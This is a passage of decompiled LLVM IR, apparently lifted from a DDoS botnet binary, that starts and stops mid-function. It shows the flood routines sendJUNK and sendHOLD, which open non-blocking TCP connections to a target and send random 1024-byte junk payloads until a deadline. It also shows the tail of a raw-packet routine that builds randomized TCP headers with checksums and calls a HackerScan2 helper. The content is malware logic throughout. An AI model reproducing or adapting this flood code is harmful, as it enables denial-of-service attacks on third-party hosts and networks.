  %v1_10e10 = load i32, i32* @sp, align 4
  %v2_10e10 = inttoptr i32 %v1_10e10 to i32*
  store i32 %v2_10e0c, i32* %v2_10e10, align 4
  %v1_10e18 = load i32, i32* @sp, align 4
  %v2_10e18 = add i32 %v1_10e18, 4
  %v3_10e18 = inttoptr i32 %v2_10e18 to i32*
  store i32 16, i32* %v3_10e18, align 4
  %v0_10e20 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_109c0, i32* %r2.global-to-local, align 4
  %v6_10e2c = call i32 @__libc_sendto(i32 %v3_10910, i32 %v0_10e20, i32 %v1_109c0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10e34 = call i32 @HackerScan2(i32 %storemerge9)
  %v1_10e40 = call i32 @__GI_htonl(i32 %v1_10e34)
  store i32 %v1_10e40, i32* %r2.global-to-local, align 4
  store i32 %v1_10e40, i32* %v3_10e4c, align 4
  %v0_10e50 = call i32 @rand_cmwc()
  %v3_10e5c = urem i32 %v0_10e50, 65536
  store i32 %v3_10e5c, i32* %r2.global-to-local, align 4
  %v1_10e64 = trunc i32 %v0_10e50 to i16
  store i16 %v1_10e64, i16* %v4_10e64, align 4
  %v0_10e68 = call i32 @rand_cmwc()
  store i32 %v0_10e68, i32* %r2.global-to-local, align 4
  store i32 %v0_10e68, i32* %v3_10a74, align 8
  %v0_10e78 = call i32 @rand_cmwc()
  %v1_10e8c = trunc i32 %v0_10e78 to i16
  store i16 %v1_10e8c, i16* %v5_10a14, align 4
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_10d44, align 4
  %v4_10ea4 = call i32 @tcpcsum(i32 %v3_109f0, i32 %v1_10a10)
  %v1_10eb4 = trunc i32 %v4_10ea4 to i16
  store i16 %v1_10eb4, i16* %v4_10d44, align 4
  store i32 %v3_109f0, i32* %r2.global-to-local, align 4
  %v3_10ec4 = load i16, i16* %v2_10dc8, align 2
  %v4_10ec4 = zext i16 %v3_10ec4 to i32
  %v3_10ed0 = call i32 @csum(i16* %v2_10dd4, i32 %v4_10ec4)
  %sext5 = mul i32 %v3_10ed0, 65536
  %v1_10ed4 = sdiv i32 %sext5, 65536
  store i32 %v1_10ed4, i32* %r2.global-to-local, align 4
  %v1_10ee0 = trunc i32 %v1_10ed4 to i16
  store i16 %v1_10ee0, i16* %v4_10de4, align 2
  %v9_10eec = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_10eec, label %dec_label_pc_10ef4, label %dec_label_pc_10f18

dec_label_pc_10ef4:                               ; preds = %dec_label_pc_10e08
  %v2_10ef8 = call i32 @__GI_time(i32* null)
  store i32 %v2_10ef8, i32* %r2.global-to-local, align 4
  %v8_10f08 = icmp sgt i32 %v2_10ef8, %v2_10df8
  br i1 %v8_10f08, label %dec_label_pc_10f28, label %dec_label_pc_10f0c

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10ef4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10e08
  %v1_10f1c = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_10e08

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10ef4, %dec_label_pc_108c8, %dec_label_pc_10974, %dec_label_pc_10928
  %v1_10f34 = phi i32 [ %v3_108d8, %dec_label_pc_108c8 ], [ %v3_10984, %dec_label_pc_10974 ], [ %v3_10938, %dec_label_pc_10928 ], [ %v2_10ef8, %dec_label_pc_10ef4 ]
  ret i32 %v1_10f34

; uselistorder directives
  uselistorder i32 %v1_10ed4, { 1, 0 }
  uselistorder i32 %v0_10e50, { 1, 0 }
  uselistorder i32 %v1_10dd8, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_10bb8, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_10ac8, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_10a50, { 1, 0 }
  uselistorder i32 %v1_10a10, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_109f0, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_109c0, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f28, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10d94, { 1, 0 }
  uselistorder label %dec_label_pc_10d04, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10b98, { 1, 0 }
  uselistorder label %dec_label_pc_109bc, { 1, 0 }
  uselistorder label %dec_label_pc_108c8, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_10f68 = load i32, i32* @r4, align 4
  store i32 69488, i32* %stack_var_-4, align 4
  %v2_10f6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10f6c, i32* @fp, align 4
  %v0_10f88 = call i32 @getdtablesize()
  store i32 %v0_10f88, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_10f88, 0
  %v3_10f90 = zext i1 %tmp to i32
  %v2_10f94 = add i32 %v3_10f90, %v0_10f88
  %v3_10f98 = sdiv i32 %v2_10f94, 2
  store i32 2, i32* %stack_var_-72, align 4
  %v3_10fb0 = urem i32 %arg2, 65536
  %v1_10fb8 = call i32 @__GI_htons(i32 %v3_10fb0)
  %v3_10fd4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-68)
  %v2_10fdc = icmp eq i32 %v3_10fd4, 0
  br i1 %v2_10fdc, label %dec_label_pc_10fe8, label %dec_label_pc_11458

dec_label_pc_10fe8:                               ; preds = %entry
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_10ffc = bitcast i32* %stack_var_-64 to i8*
  %v4_10ffc = call i32 @__GI_memset(i8* %v3_10ffc, i32 0, i32 8)
  %v3_11004 = mul i32 %v3_10f98, 8
  %v1_11008 = or i32 %v3_11004, 7
  %v1_1100c = add i32 %v1_11008, 7
  %v3_11010 = and i32 %v1_1100c, -8
  %v1_11018 = load i32, i32* @sp, align 4
  %v2_11018 = sub i32 %v1_11018, %v3_11010
  %v1_11028 = add i32 %v2_11018, 15
  %v3_1102c = and i32 %v1_11028, -8
  %v2_11050 = mul i32 %v3_10f98, 5
  store i32 %v2_11050, i32* %r2.global-to-local, align 4
  %v3_11060 = inttoptr i32 %v3_1102c to i8*
  %v4_11060 = call i32 @__GI_memset(i8* %v3_11060, i32 0, i32 %v2_11050)
  %v1_11068 = call i32 @malloc(i32 1024)
  store i32 1024, i32* %r2.global-to-local, align 4
  %v3_11080 = inttoptr i32 %v1_11068 to i8*
  %v4_11080 = call i32 @__GI_memset(i8* %v3_11080, i32 0, i32 1024)
  %v2_11088 = call i32 @__GI_time(i32* null)
  store i32 %v2_11088, i32* %r2.global-to-local, align 4
  %v2_11094 = add i32 %v2_11088, %arg3
  %v2_111d0 = ptrtoint i32* %stack_var_-200 to i32
  %v2_11228 = ptrtoint i32* %stack_var_-24 to i32
  %v2_11294 = ptrtoint i32* %stack_var_-208 to i32
  %v2_112d8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_112dc = ptrtoint i32* %stack_var_-212 to i32
  %v2_11160 = ptrtoint i32* %stack_var_-72 to i32
  %v8_1143845 = icmp sgt i32 %v2_10f94, 1
  %v2_1122c = add i32 %v2_11228, -176
  br label %dec_label_pc_11440

dec_label_pc_110ac:                               ; preds = %dec_label_pc_11430.preheader, %dec_label_pc_11424
  %storemerge248 = phi i32 [ %v1_11428, %dec_label_pc_11424 ], [ 0, %dec_label_pc_11430.preheader ]
  store i32 %v3_1102c, i32* %r2.global-to-local, align 4
  %v3_110b8 = mul i32 %storemerge248, 8
  %v2_110bc = add i32 %v3_110b8, %v3_1102c
  %v2_110c0 = or i32 %v2_110bc, 4
  %v1_110c4 = inttoptr i32 %v2_110c0 to i8*
  %v2_110c4 = load i8, i8* %v1_110c4, align 4
  %v6_110d0 = icmp eq i8 %v2_110c4, 0
  %v7_110d0 = icmp eq i8 %v2_110c4, 1
  br i1 %v7_110d0, label %dec_label_pc_111e4.lr.ph, label %dec_label_pc_110d8

dec_label_pc_110d8:                               ; preds = %dec_label_pc_110ac
  %v7_110dc = icmp eq i8 %v2_110c4, 2
  br i1 %v7_110dc, label %dec_label_pc_113a4, label %dec_label_pc_110e4

dec_label_pc_110e4:                               ; preds = %dec_label_pc_110d8
  br i1 %v6_110d0, label %dec_label_pc_110f4, label %dec_label_pc_11424

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110e4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11104 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_11110 = mul i32 %storemerge248, 8
  %v6_11110 = add i32 %v5_11110, %v3_1102c
  %v7_11110 = inttoptr i32 %v6_11110 to i32*
  store i32 %v3_11104, i32* %v7_11110, align 8
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_1111c = inttoptr i32 %v2_110bc to i32*
  %v7_1111c = load i32, i32* %v6_1111c, align 8
  store i32 %v7_1111c, i32* @r4, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11128 = load i32, i32* %v6_1111c, align 8
  store i32 %v7_11128, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_11138 = call i32 @__libc_fcntl(i32 %v7_11128, i32 3)
  %v1_11140 = or i32 %v2_11138, 2048
  store i32 %v1_11140, i32* @r3, align 4
  %v0_11144 = load i32, i32* @r4, align 4
  store i32 %v1_11140, i32* @r2, align 4
  %v2_11150 = call i32 @__libc_fcntl(i32 %v0_11144, i32 4)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_1115c = load i32, i32* %v6_1111c, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11170 = call i32 @__libc_connect(i32 %v7_1115c, i32 %v2_11160, i32 16)
  %v3_11178 = icmp eq i32 %v3_11170, -1
  br i1 %v3_11178, label %dec_label_pc_11180, label %dec_label_pc_11194

dec_label_pc_11180:                               ; preds = %dec_label_pc_110f4
  %v0_11180 = call i32 @__GI___errno_location()
  %v1_11188 = inttoptr i32 %v0_11180 to i32*
  %v2_11188 = load i32, i32* %v1_11188, align 4
  %v7_1118c = icmp eq i32 %v2_11188, 115
  br i1 %v7_1118c, label %dec_label_pc_111ac, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_110f4, %dec_label_pc_11180
  store i32 %v3_1102c, i32* %r2.global-to-local, align 4
  %v7_1119c = load i32, i32* %v6_1111c, align 8
  %v1_111a4 = call i32 @__GI___libc_close(i32 %v7_1119c)
  br label %dec_label_pc_11424

dec_label_pc_111ac:                               ; preds = %dec_label_pc_11180
  store i32 %v2_110c0, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_110c4, align 4
  br label %dec_label_pc_11424

dec_label_pc_111e4.lr.ph:                         ; preds = %dec_label_pc_110ac
  br label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %dec_label_pc_111e4.lr.ph, %dec_label_pc_111e4
  %storemerge37 = phi i32 [ 0, %dec_label_pc_111e4.lr.ph ], [ %v1_111f8, %dec_label_pc_111e4 ]
  store i32 %v2_111d0, i32* %r2.global-to-local, align 4
  %v5_111f0 = mul nuw nsw i32 %storemerge37, 4
  %v6_111f0 = add i32 %v5_111f0, %v2_111d0
  %v7_111f0 = inttoptr i32 %v6_111f0 to i32*
  store i32 0, i32* %v7_111f0, align 4
  %v1_111f8 = add nuw nsw i32 %storemerge37, 1
  %tmp39 = icmp ult i32 %v1_111f8, 32
  br i1 %tmp39, label %dec_label_pc_111e4, label %dec_label_pc_1120c

dec_label_pc_1120c:                               ; preds = %dec_label_pc_111e4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_11214 = inttoptr i32 %v2_110bc to i32*
  %v7_11214 = load i32, i32* %v6_11214, align 8
  %v3_11218 = udiv i32 %v7_11214, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_11224 = mul nuw nsw i32 %v3_11218, 4
  %v2_11230 = add i32 %v2_1122c, %v3_11224
  %v1_11234 = inttoptr i32 %v2_11230 to i32*
  %v2_11234 = load i32, i32* %v1_11234, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11240 = load i32, i32* %v6_11214, align 8
  %v1_11244 = urem i32 %v7_11240, 32
  %v6_1124c = shl i32 1, %v1_11244
  %v2_11250 = or i32 %v6_1124c, %v2_11234
  store i32 %v2_11250, i32* %v1_11234, align 4
  store i32 0, i32* %stack_var_-208, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11288 = load i32, i32* %v6_11214, align 8
  %v1_1128c = add i32 %v7_11288, 1
  store i32 %v1_1128c, i32* %r2.global-to-local, align 4
  %v1_11298 = load i32, i32* @sp, align 4
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  store i32 %v2_11294, i32* %v2_11298, align 4
  %v0_1129c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_111d0, i32* %r2.global-to-local, align 4
  %v4_112ac = load i32, i32* %stack_var_-208, align 4
  %v5_112ac = call i32 @__libc_select(i32 %v0_1129c, i32 0, i32 %v2_111d0, i32 0, i32 %v4_112ac)
  %v7_112bc = icmp eq i32 %v5_112ac, 1
  br i1 %v7_112bc, label %dec_label_pc_112c4, label %dec_label_pc_11360

dec_label_pc_112c4:                               ; preds = %dec_label_pc_1120c
  store i32 4, i32* %stack_var_-212, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_112d4 = load i32, i32* %v6_11214, align 8
  store i32 %v7_112d4, i32* %r2.global-to-local, align 4
  %v1_112e0 = load i32, i32* @sp, align 4
  %v2_112e0 = inttoptr i32 %v1_112e0 to i32*
  store i32 %v2_112dc, i32* %v2_112e0, align 4
  %v0_112e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_112f4 = load i32, i32* %stack_var_-212, align 4
  %v5_112f4 = call i32 @getsockopt(i32 %v0_112e4, i32 1, i32 4, i32 %v2_112d8, i32 %v4_112f4)
  %v3_112f8 = load i32, i32* %stack_var_-216, align 4
  %v2_112fc = icmp eq i32 %v3_112f8, 0
  br i1 %v2_112fc, label %dec_label_pc_1133c, label %dec_label_pc_11304

dec_label_pc_11304:                               ; preds = %dec_label_pc_112c4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_1130c = load i32, i32* %v6_11214, align 8
  %v1_11314 = call i32 @__GI___libc_close(i32 %v7_1130c)
  store i32 %v2_110c0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_110c4, align 4
  br label %dec_label_pc_11424

dec_label_pc_1133c:                               ; preds = %dec_label_pc_112c4
  store i32 %v2_110c0, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_110c4, align 4
  br label %dec_label_pc_11424

dec_label_pc_11360:                               ; preds = %dec_label_pc_1120c
  %v3_11364 = icmp eq i32 %v5_112ac, -1
  br i1 %v3_11364, label %dec_label_pc_1136c, label %dec_label_pc_11424

dec_label_pc_1136c:                               ; preds = %dec_label_pc_11360
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11374 = load i32, i32* %v6_11214, align 8
  %v1_1137c = call i32 @__GI___libc_close(i32 %v7_11374)
  store i32 %v2_110c0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_110c4, align 4
  br label %dec_label_pc_11424

dec_label_pc_113a4:                               ; preds = %dec_label_pc_110d8
  %v2_113ac = call i32 @makeRandomStr(i32 %v1_11068, i32 1024)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_113b8 = inttoptr i32 %v2_110bc to i32*
  %v7_113b8 = load i32, i32* %v6_113b8, align 8
  store i32 1024, i32* %r2.global-to-local, align 4
  %v4_113cc = call i32 @__libc_send(i32 %v7_113b8, i32 %v1_11068, i32 1024, i32 16384)
  %v3_113d4 = icmp eq i32 %v4_113cc, -1
  br i1 %v3_113d4, label %dec_label_pc_113dc, label %dec_label_pc_11424

dec_label_pc_113dc:                               ; preds = %dec_label_pc_113a4
  %v0_113dc = call i32 @__GI___errno_location()
  %v1_113e4 = inttoptr i32 %v0_113dc to i32*
  %v2_113e4 = load i32, i32* %v1_113e4, align 4
  %v7_113e8 = icmp eq i32 %v2_113e4, 11
  br i1 %v7_113e8, label %dec_label_pc_11424, label %dec_label_pc_113f0

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113dc
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_113f8 = load i32, i32* %v6_113b8, align 8
  %v1_11400 = call i32 @__GI___libc_close(i32 %v7_113f8)
  store i32 %v2_110c0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_110c4, align 4
  br label %dec_label_pc_11424

dec_label_pc_11424:                               ; preds = %dec_label_pc_110e4, %dec_label_pc_11360, %dec_label_pc_113a4, %dec_label_pc_113dc, %dec_label_pc_1136c, %dec_label_pc_1133c, %dec_label_pc_11304, %dec_label_pc_111ac, %dec_label_pc_11194, %dec_label_pc_113f0
  %v1_11428 = add nuw nsw i32 %storemerge248, 1
  store i32 %v1_11428, i32* %r2.global-to-local, align 4
  %v5_1143c = icmp slt i32 %v1_11428, %v3_10f98
  br i1 %v5_1143c, label %dec_label_pc_110ac, label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_11430.preheader, %dec_label_pc_11424, %dec_label_pc_10fe8
  %v2_11444 = call i32 @__GI_time(i32* null)
  store i32 %v2_11444, i32* %r2.global-to-local, align 4
  %v5_11454 = icmp slt i32 %v2_11444, %v2_11094
  br i1 %v5_11454, label %dec_label_pc_11430.preheader, label %dec_label_pc_11458

dec_label_pc_11430.preheader:                     ; preds = %dec_label_pc_11440
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1143845, label %dec_label_pc_110ac, label %dec_label_pc_11440

dec_label_pc_11458:                               ; preds = %dec_label_pc_11440, %entry
  %v1_11464 = phi i32 [ %v3_10fd4, %entry ], [ %v2_11444, %dec_label_pc_11440 ]
  store i32 %v3_10f68, i32* @r4, align 4
  ret i32 %v1_11464

; uselistorder directives
  uselistorder i32 %v1_11428, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_110c4, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_110c0, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_110bc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge248, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 12, 11, 10, 0, 13 }
  uselistorder i32 %v2_111d0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_11050, { 1, 0 }
  uselistorder i32 %v3_1102c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_10f98, { 1, 2, 0 }
  uselistorder i32 %v0_10f88, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 37, 31, 30, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 33, 34, 35, 36, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_11424, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_111e4, { 1, 0 }
  uselistorder label %dec_label_pc_11194, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1146c = load i32, i32* @r4, align 4
  store i32 70772, i32* %stack_var_-4, align 4
  %v2_11470 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11470, i32* @fp, align 4
  %v0_1148c = call i32 @getdtablesize()
  store i32 %v0_1148c, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_1148c, 0
  %v3_11494 = zext i1 %tmp to i32
  %v2_11498 = add i32 %v3_11494, %v0_1148c
  %v3_1149c = sdiv i32 %v2_11498, 2
  store i32 2, i32* %stack_var_-80, align 4
  %v3_114b4 = urem i32 %arg2, 65536
  %v1_114bc = call i32 @__GI_htons(i32 %v3_114b4)
  %v3_114d8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_114e0 = icmp eq i32 %v3_114d8, 0
  br i1 %v2_114e0, label %dec_label_pc_114ec, label %dec_label_pc_11a04

dec_label_pc_114ec:                               ; preds = %entry
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_11500 = bitcast i32* %stack_var_-72 to i8*
  %v4_11500 = call i32 @__GI_memset(i8* %v3_11500, i32 0, i32 8)
  %v3_11508 = mul i32 %v3_1149c, 8
  %v1_1150c = or i32 %v3_11508, 7
  %v1_11510 = add i32 %v1_1150c, 7
  %v3_11514 = and i32 %v1_11510, -8
  %v1_1151c = load i32, i32* @sp, align 4
  %v2_1151c = sub i32 %v1_1151c, %v3_11514
  %v1_1152c = add i32 %v2_1151c, 15
  %v3_11530 = and i32 %v1_1152c, -8
  %v2_11554 = mul i32 %v3_1149c, 5
  store i32 %v2_11554, i32* %r2.global-to-local, align 4
  %v3_11564 = inttoptr i32 %v3_11530 to i8*
  %v4_11564 = call i32 @__GI_memset(i8* %v3_11564, i32 0, i32 %v2_11554)
  %v1_1156c = call i32 @malloc(i32 1024)
  store i32 1024, i32* %r2.global-to-local, align 4
  %v3_11584 = inttoptr i32 %v1_1156c to i8*
  %v4_11584 = call i32 @__GI_memset(i8* %v3_11584, i32 0, i32 1024)
  %v2_1158c = call i32 @__GI_time(i32* null)
  store i32 %v2_1158c, i32* %r2.global-to-local, align 4
  %v2_11598 = add i32 %v2_1158c, %arg3
  %v2_116d4 = ptrtoint i32* %stack_var_-208 to i32
  %v2_1172c = ptrtoint i32* %stack_var_-24 to i32
  %v2_11798 = ptrtoint i32* %stack_var_-216 to i32
  %v2_117dc = ptrtoint i32* %stack_var_-224 to i32
  %v2_117e0 = ptrtoint i32* %stack_var_-220 to i32
  %v2_11664 = ptrtoint i32* %stack_var_-80 to i32
  %v8_119e454 = icmp sgt i32 %v2_11498, 1
  %v2_11730 = add i32 %v2_1172c, -184
  br label %dec_label_pc_119ec

dec_label_pc_115b0:                               ; preds = %dec_label_pc_119dc.preheader, %dec_label_pc_119d0
  %storemerge357 = phi i32 [ %v1_119d4, %dec_label_pc_119d0 ], [ 0, %dec_label_pc_119dc.preheader ]
  store i32 %v3_11530, i32* %r2.global-to-local, align 4
  %v3_115bc = mul i32 %storemerge357, 8
  %v2_115c0 = add i32 %v3_115bc, %v3_11530
  %v2_115c4 = or i32 %v2_115c0, 4
  %v1_115c8 = inttoptr i32 %v2_115c4 to i8*
  %v2_115c8 = load i8, i8* %v1_115c8, align 4
  %v6_115d4 = icmp eq i8 %v2_115c8, 0
  %v7_115d4 = icmp eq i8 %v2_115c8, 1
  br i1 %v7_115d4, label %dec_label_pc_116e8.lr.ph, label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_115b0
  %v7_115e0 = icmp eq i8 %v2_115c8, 2
  br i1 %v7_115e0, label %dec_label_pc_118bc.lr.ph, label %dec_label_pc_115e8

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115dc
  br i1 %v6_115d4, label %dec_label_pc_115f8, label %dec_label_pc_119d0

dec_label_pc_115f8:                               ; preds = %dec_label_pc_115e8
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11608 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_11614 = mul i32 %storemerge357, 8
  %v6_11614 = add i32 %v5_11614, %v3_11530
  %v7_11614 = inttoptr i32 %v6_11614 to i32*
  store i32 %v3_11608, i32* %v7_11614, align 8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_11620 = inttoptr i32 %v2_115c0 to i32*
  %v7_11620 = load i32, i32* %v6_11620, align 8
  store i32 %v7_11620, i32* @r4, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_1162c = load i32, i32* %v6_11620, align 8
  store i32 %v7_1162c, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_1163c = call i32 @__libc_fcntl(i32 %v7_1162c, i32 3)
  %v1_11644 = or i32 %v2_1163c, 2048
  store i32 %v1_11644, i32* @r3, align 4
  %v0_11648 = load i32, i32* @r4, align 4
  store i32 %v1_11644, i32* @r2, align 4
  %v2_11654 = call i32 @__libc_fcntl(i32 %v0_11648, i32 4)
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11660 = load i32, i32* %v6_11620, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11674 = call i32 @__libc_connect(i32 %v7_11660, i32 %v2_11664, i32 16)
  %v3_1167c = icmp eq i32 %v3_11674, -1
  br i1 %v3_1167c, label %dec_label_pc_11684, label %dec_label_pc_11698

dec_label_pc_11684:                               ; preds = %dec_label_pc_115f8
  %v0_11684 = call i32 @__GI___errno_location()
  %v1_1168c = inttoptr i32 %v0_11684 to i32*
  %v2_1168c = load i32, i32* %v1_1168c, align 4
  %v7_11690 = icmp eq i32 %v2_1168c, 115
  br i1 %v7_11690, label %dec_label_pc_116b0, label %dec_label_pc_11698

dec_label_pc_11698:                               ; preds = %dec_label_pc_115f8, %dec_label_pc_11684
  store i32 %v3_11530, i32* %r2.global-to-local, align 4
  %v7_116a0 = load i32, i32* %v6_11620, align 8
  %v1_116a8 = call i32 @__GI___libc_close(i32 %v7_116a0)
  br label %dec_label_pc_119d0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_11684
  store i32 %v2_115c4, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_115c8, align 4
  br label %dec_label_pc_119d0

dec_label_pc_116e8.lr.ph:                         ; preds = %dec_label_pc_115b0
  br label %dec_label_pc_116e8

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116e8.lr.ph, %dec_label_pc_116e8
  %storemerge513 = phi i32 [ 0, %dec_label_pc_116e8.lr.ph ], [ %v1_116fc, %dec_label_pc_116e8 ]
  store i32 %v2_116d4, i32* %r2.global-to-local, align 4
  %v5_116f4 = mul nuw nsw i32 %storemerge513, 4
  %v6_116f4 = add i32 %v5_116f4, %v2_116d4
  %v7_116f4 = inttoptr i32 %v6_116f4 to i32*
  store i32 0, i32* %v7_116f4, align 4
  %v1_116fc = add nuw nsw i32 %storemerge513, 1
  %tmp47 = icmp ult i32 %v1_116fc, 32
  br i1 %tmp47, label %dec_label_pc_116e8, label %dec_label_pc_11710

dec_label_pc_11710:                               ; preds = %dec_label_pc_116e8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_11718 = inttoptr i32 %v2_115c0 to i32*
  %v7_11718 = load i32, i32* %v6_11718, align 8
  %v3_1171c = udiv i32 %v7_11718, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_11728 = mul nuw nsw i32 %v3_1171c, 4
  %v2_11734 = add i32 %v2_11730, %v3_11728
  %v1_11738 = inttoptr i32 %v2_11734 to i32*
  %v2_11738 = load i32, i32* %v1_11738, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
